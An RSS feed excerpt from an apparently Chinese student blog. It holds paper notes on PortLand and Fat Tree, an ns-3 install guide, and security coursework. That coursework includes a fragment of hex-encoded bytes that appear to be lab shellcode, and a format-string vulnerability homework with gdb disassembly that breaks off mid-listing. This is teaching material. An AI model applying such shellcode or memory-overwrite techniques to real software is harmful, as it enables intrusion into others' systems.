style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令成功完成。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Z:&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;oStudentCh11-3&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看用户&#34;&gt;查看用户&lt;/h3&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anonymity-0/Picgo@note_picture/img/IMG_2950.5a07nmrq7p40.webp&#34; alt=&#34;IMG_2950&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Portland</title>
      <link>//localhost:64783/posts/portland/</link>
      <pubDate>Wed, 20 Dec 2023 22:51:25 +0800</pubDate>
      <guid>//localhost:64783/posts/portland/</guid>
      <description>&lt;h1 id=&#34;portland-a-scalable-fault-tolerant-layer-2-data-center-network-fabric&#34;&gt;PortLand: a scalable fault-tolerant layer 2 data center network fabric&lt;/h1&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;-meta-data&#34;&gt;💡 Meta Data&lt;/h2&gt;&#xA;&lt;!-- raw HTML omitted --&gt;&#xA;&lt;h2 id=&#34;-研究背景--基础--目的&#34;&gt;📜 研究背景 &amp;amp; 基础 &amp;amp; 目的&lt;/h2&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;这篇论文的研究背景是针对日益增长的数据中心网络中存在的限制和挑战，例如在现有的层2和层3网络协议在支持大规模数据中心中的灵活性、效率和容错性方面存在的局限性 在笔者提出的论文中，研究的基础是现有网络协议在面临未来单个站点拥有数百万虚拟终端的数据中心时所面临的挑战，特别是关注于如何在这种大规模环境中实现可扩展、易管理、容错和高效的数据中心网络结构&lt;/p&gt;&#xA;&lt;p&gt;论文的目的是设计和实现一种名为PortLand的协议，该协议旨在解决现有网络在数据中心部署中的局限性，通过提供一种可扩展、容错、并适用于数据中心环境的层2路由和转发协议通过PortLand协议的设计和实施，论文的目的是展示该协议能够支持“即插即用”的大规模数据中心网络，并为数据中心网络提供更灵活、高效和容错的解决方案&lt;/p&gt;&#xA;&lt;p&gt;ARP是地址解析协议（Address Resolution Protocol），用于将IP地址映射成对应的MAC地址的协议。在局域网中，当一台设备需要发送数据给另一台设备时，它会使用ARP来获取目标设备的MAC地址，以便将数据发送到正确的目标。ARP协议在以太网和其他局域网技术中广泛使用。&lt;/p&gt;&#xA;&lt;h2 id=&#34;-研究内容&#34;&gt;📊 研究内容&lt;/h2&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;strong&gt;PMAC是如何设计的&lt;/strong&gt;&lt;br&gt;&#xA;PMAC（Pseudo MAC）地址的设计是基于一种层次化的编码方式。在PortLand中，每个主机被分配一个唯一的PMAC地址，该地址编码了主机在拓扑结构上的位置。例如，在同一个pod中的所有终节点的PMAC地址具有相同的前缀。主机保持不变，认为它们仍然使用其实际的MAC地址（AMAC）。当主机发送ARP请求时，它们接收到目标主机的PMAC地址[5a]。所有的数据包转发都是基于PMAC地址进行的，这样可以实现非常小的转发表。发送数据包时，出口交换机会对PMAC地址进行重写，将其转换为目标主机的AMAC地址，以保持主机不变的MAC地址的幻象。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anonymity-0/Picgo@note_picture/img/image.58jtvgee9ds0.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;步骤1：当入口交换机首次看到源MAC地址时，会将数据包传送到交换机。&lt;/p&gt;&#xA;&lt;p&gt;步骤2a：软件在本地PMAC表中创建一个条目，将主机的AMAC和IP地址映射到其PMAC。边缘交换机决定PMAC。&lt;/p&gt;&#xA;&lt;p&gt;步骤2b：交换机将此映射通信给“Fabric Manager”。&lt;/p&gt;&#xA;&lt;p&gt;步骤3：“Fabric Manager”使用此状态来响应ARP请求。交换机还会创建适当的流表条目，将 PMAC 目标地址重写为 AMAC，以便对任何发送到主机的流量重写PMAC目的地地址。&lt;/p&gt;&#xA;&lt;h3 id=&#34;proxy-based-arp&#34;&gt;Proxy-based ARP&lt;/h3&gt;&#xA;&lt;p&gt;“Ethernet by default broadcasts ARPs to all hosts in the same layer 2 domain. We leverage the fabric manager to reduce broadcast overhead in the common case, as depicted in Figure 3. In step 1, an edge switch intercepts an ARP request for an IP to MAC address mapping and forwards the request to the fabric manager in step 2. The fabric manager consults its PMAC table to see if an entry is available for the target IP address. If so, it returns the PMAC in step 3 to the edge switch. The edge switch creates an ARP reply in step 4 and returns it to the original host.” (Niranjan Mysore 等, 2009, p. 43) 🔤以太网默认情况下会向同一第 2 层域中的所有主机广播 ARP。如图 3 所示，我们利用结构管理器来减少普通情况下的广播开销。在步骤 1 中，边缘交换机拦截 IP 到 MAC 地址映射的 ARP 请求，并在步骤 2 中将请求转发给结构管理器。Fabric 管理器会查询其 PMAC 表，查看是否有目标 IP 地址的条目。如果有，它会在步骤 3 中将 PMAC 返回给边缘交换机。边缘交换机在步骤 4 中创建 ARP 回复，并将其返回给原始主机。🔤&lt;/p&gt;</description>
    </item>
    <item>
      <title>Fat Tree</title>
      <link>//localhost:64783/posts/fat-tree/</link>
      <pubDate>Tue, 19 Dec 2023 15:45:19 +0800</pubDate>
      <guid>//localhost:64783/posts/fat-tree/</guid>
      <description>&lt;p&gt;A scalable, commodity data center network architecture&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;-meta-data&#34;&gt;💡 Meta Data&lt;/h2&gt;&#xA;&lt;!-- raw HTML omitted --&gt;&#xA;&lt;h2 id=&#34;-研究背景--基础--目的&#34;&gt;📜 研究背景 &amp;amp; 基础 &amp;amp; 目的&lt;/h2&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;“Clusters consisting of tens of thousands of PCs are not unheard of in the largest “institutions and thousand-node clusters are increasingly common in universities, research labs, and companies.”  (Al-Fares 等, 2008, p. 63) 大型机构中由数万台PC组成的集群并不少见，在大学，研究实验室和公司中，千节点集群越来越普遍。这些集群用于各种目的，包括科学计算，数据分析和机器学习。它们提供了大量的计算能力，可用于解决复杂问题。&lt;/p&gt;&#xA;&lt;h3 id=&#34;dc-communications&#34;&gt;DC Communications&lt;/h3&gt;&#xA;&lt;p&gt;M2M communications：M2M communications，即机器对机器通信，是指机器与机器之间进行的数据通信。M2M通信的目的通常是实现机器之间的自动化控制和数据交换。&lt;/p&gt;&#xA;&lt;p&gt;“Today, the principle bottleneck in large-scale clusters is often inter-node communication bandwidth.” (Al-Fares 等, 2008, p. 63) 如今，大规模集群的主要瓶颈往往是节点间的通信带宽。&lt;/p&gt;</description>
    </item>
    <item>
      <title>NS 3初上手</title>
      <link>//localhost:64783/posts/ns-3%E5%88%9D%E4%B8%8A%E6%89%8B/</link>
      <pubDate>Mon, 18 Dec 2023 15:38:41 +0800</pubDate>
      <guid>//localhost:64783/posts/ns-3%E5%88%9D%E4%B8%8A%E6%89%8B/</guid>
      <description>&lt;h2 id=&#34;介绍&#34;&gt;介绍&lt;/h2&gt;&#xA;&lt;p&gt;ns3是用来进行网络仿真的一个平台&lt;/p&gt;&#xA;&lt;h2 id=&#34;学习资源&#34;&gt;学习资源&lt;/h2&gt;&#xA;&lt;p&gt;略&lt;/p&gt;&#xA;&lt;h2 id=&#34;安装&#34;&gt;安装&lt;/h2&gt;&#xA;&lt;h3 id=&#34;源码安装&#34;&gt;源码安装&lt;/h3&gt;&#xA;&lt;p&gt;详情可参考&lt;a href=&#34;https://www.nsnam.org/docs/release/3.40/installation/html/index.html&#34;&gt;ns-3 Installation Guide — Installation guide&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;下载源码&#xA;[Releases | ns-3](&lt;a href=&#34;https://www.nsnam.org/releases/&#34;&gt;https://www.nsnam.org/releases/&lt;/a&gt;&#xA;进入网站选择版本下载&lt;/li&gt;&#xA;&lt;li&gt;编译源码&#xA;解压进入文件夹&#xA;&lt;code&gt;cd /Users/x x x/Downloads/ns-allinone-3.40&lt;/code&gt;&#xA;编译文件&#xA;&lt;code&gt;./build.py --enable-examples --enable-tests&lt;/code&gt;&#xA;注：记得提前安装好cmake&#xA;&lt;code&gt;brew install cmake&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;安装完成以后&lt;code&gt;cd ns-3.40&lt;/code&gt;可以通过ls查看文件内容&lt;/p&gt;&#xA;&lt;p&gt;在ns-3.36版本之后，ns-3的构建系统从waf更改为CMake，并引入了一个名为ns3的Python脚本来替代waf&lt;/p&gt;&#xA;&lt;h3 id=&#34;运行第一个模拟仿真脚本&#34;&gt;运行第一个模拟仿真脚本&lt;/h3&gt;&#xA;&lt;p&gt;通过 &lt;code&gt;./ns3 run hello-simulator&lt;/code&gt; 运行&lt;/p&gt;&#xA;&lt;h3 id=&#34;测试的安装&#34;&gt;测试的安装&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;agq@AGdeMacBook-Air ns-3.40 % ./test.py&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>网络安全作业8</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/</link>
      <pubDate>Mon, 18 Dec 2023 11:28:18 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/</guid>
      <description>&lt;p&gt;题目：在32位的ubuntu16.04运行环境下，对格式化漏洞程序vul_formatstr2.c，参照&#xA;12.2.4的方法，说明如何修改程序，将变量B的值改成0x5678CDEF。&lt;/p&gt;&#xA;&lt;p&gt;在Ubuntu 64位系统上，使用以下命令来安装gcc多架构编译器和32位库：&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;sudo apt-get install gcc-multilib libc6-dev-i386&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;在编译C程序时，使用&lt;code&gt;-m32&lt;/code&gt;选项来生成32位的可执行文件。例如：&#xA;&lt;code&gt;gcc -m32 -o v2 vul_formatstr2.c&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;azureuser@MyServer:~/hw$ gdb v2&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000122d &amp;lt;+0&amp;gt;:     endbr32 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001231 &amp;lt;+4&amp;gt;:     push   %ebp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001232 &amp;lt;+5&amp;gt;:     mov    %esp,%ebp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001234 &amp;lt;+7&amp;gt;:     push   %ebx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001235 &amp;lt;+8&amp;gt;:     sub    $0x414,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000123b &amp;lt;+14&amp;gt;:    call   0x1130 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001240 &amp;lt;+19&amp;gt;:    add    $0x2d8c,%ebx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001246 &amp;lt;+25&amp;gt;:    mov    %gs:0x14,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000124c &amp;lt;+31&amp;gt;:    mov    %eax,-0xc&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000124f &amp;lt;+34&amp;gt;:    xor    %eax,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001251 &amp;lt;+36&amp;gt;:    movl   $0x3435,-0x418&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000125b &amp;lt;+46&amp;gt;:    movl   $0x5657,-0x414&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001265 &amp;lt;+56&amp;gt;:    movl   $0x7879,-0x410&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000126f &amp;lt;+66&amp;gt;:    lea    -0x410&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001275 &amp;lt;+72&amp;gt;:    push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001276 &amp;lt;+73&amp;gt;:    lea    -0x414&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000127c &amp;lt;+79&amp;gt;:    push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000127d &amp;lt;+80&amp;gt;:    lea    -0x418&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001283 &amp;lt;+86&amp;gt;:    push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001284 &amp;lt;+87&amp;gt;:    lea    -0x1fc4&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000128a &amp;lt;+93&amp;gt;:    push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000128b &amp;lt;+94&amp;gt;:    call   0x10a0 &amp;lt;printf@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001290 &amp;lt;+99&amp;gt;:    add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001293 &amp;lt;+102&amp;gt;:   mov    -0x410&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%ecx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001299 &amp;lt;+108&amp;gt;:   mov    -0x414&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%edx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000129f &amp;lt;+114&amp;gt;:   mov    -0x418&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012a5 &amp;lt;+120&amp;gt;:   push   %ecx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012a6 &amp;lt;+121&amp;gt;:   push   %edx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012a7 &amp;lt;+122&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012a8 &amp;lt;+123&amp;gt;:   lea    -0x1fab&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012ae &amp;lt;+129&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012af &amp;lt;+130&amp;gt;:   call   0x10a0 &amp;lt;printf@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012b4 &amp;lt;+135&amp;gt;:   add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012b7 &amp;lt;+138&amp;gt;:   sub    $0xc,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012ba &amp;lt;+141&amp;gt;:   lea    -0x1f94&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012c0 &amp;lt;+147&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012c1 &amp;lt;+148&amp;gt;:   call   0x10c0 &amp;lt;puts@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012c6 &amp;lt;+153&amp;gt;:   add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012c9 &amp;lt;+156&amp;gt;:   sub    $0x8,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012cc &amp;lt;+159&amp;gt;:   lea    -0x40c&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012d2 &amp;lt;+165&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012d3 &amp;lt;+166&amp;gt;:   lea    -0x1f7d&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012d9 &amp;lt;+172&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012da &amp;lt;+173&amp;gt;:   call   0x10e0 &amp;lt;__isoc99_scanf@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012df &amp;lt;+178&amp;gt;:   add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012e2 &amp;lt;+181&amp;gt;:   sub    $0xc,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012e5 &amp;lt;+184&amp;gt;:   lea    -0x40c&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012eb &amp;lt;+190&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012ec &amp;lt;+191&amp;gt;:   call   0x10a0 &amp;lt;printf@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012f1 &amp;lt;+196&amp;gt;:   add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012f4 &amp;lt;+199&amp;gt;:   sub    $0xc,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012f7 &amp;lt;+202&amp;gt;:   lea    -0x1f7a&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012fd &amp;lt;+208&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x000012fe &amp;lt;+209&amp;gt;:   call   0x10c0 &amp;lt;puts@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001303 &amp;lt;+214&amp;gt;:   add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001306 &amp;lt;+217&amp;gt;:   mov    -0x410&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%ecx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000130c &amp;lt;+223&amp;gt;:   mov    -0x414&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%edx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001312 &amp;lt;+229&amp;gt;:   mov    -0x418&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001318 &amp;lt;+235&amp;gt;:   push   %ecx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001319 &amp;lt;+236&amp;gt;:   push   %edx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000131a &amp;lt;+237&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000131b &amp;lt;+238&amp;gt;:   lea    -0x1f78&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001321 &amp;lt;+244&amp;gt;:   push   %eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001322 &amp;lt;+245&amp;gt;:   call   0x10a0 &amp;lt;printf@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001327 &amp;lt;+250&amp;gt;:   add    $0x10,%esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000132a &amp;lt;+253&amp;gt;:   nop&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 